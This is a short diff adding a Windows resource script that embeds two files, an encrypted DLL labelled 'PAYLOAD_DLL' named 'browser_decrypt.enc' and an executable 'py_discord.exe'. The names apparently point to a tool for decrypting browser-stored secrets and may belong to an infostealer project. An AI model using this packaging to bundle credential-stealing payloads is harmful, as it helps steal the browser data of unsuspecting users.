@@ -1,0 +1,7 @@
+// resource.rc
+// github: github.com/s4yr3x
+// Licensed under the MIT License. See LICENSE file in the project root for full license information.
+
+#define IDR_PYTHON_DISCORD1 101
+PAYLOAD_DLL RCDATA "browser_decrypt.enc"
+IDR_PYTHON_DISCORD1 RCDATA "py_discord.exe"
